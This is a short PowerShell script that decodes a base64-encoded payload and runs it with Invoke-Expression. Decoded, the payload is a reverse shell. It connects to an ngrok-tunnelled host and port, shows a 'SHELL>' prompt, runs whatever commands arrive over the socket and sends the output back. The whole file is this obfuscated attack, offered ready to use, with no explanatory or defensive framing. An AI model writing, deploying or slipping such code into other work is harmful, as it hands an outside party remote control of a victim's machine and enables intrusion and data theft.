$ip = "$ngrokIP"
$port = "$ngrokPort"

$b64 = "JFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCIkbmdyb2tJUCIsICRuZ3Jva1BvcnQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7IGZ1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHsgW2J5dGVbXV0kc2NyaXB0OkJ1ZmZlciA9IDAuLiRUQ1BDbGllbnQuUmVjZWl2ZUJ1ZmZlclNpemUgfCAlIHsgMCB9OyAkU3RyZWFtV3JpdGVyLldyaXRlKCRTdHJpbmcgKyAnU0hFTEw+ICcpOyAkU3RyZWFtV3JpdGVyLkZsdXNoKCkgfVdyaXRlVG9TdHJlYW0gJyc7IHdoaWxlICgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyAkQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZyB9IGNhdGNoIHsgJF8gfCBPdXQtU3RyaW5nIH1Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KSB9JFN0cmVhbVdyaXRlci5DbG9zZSgp"
$loadb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
Invoke-Expression $loadb64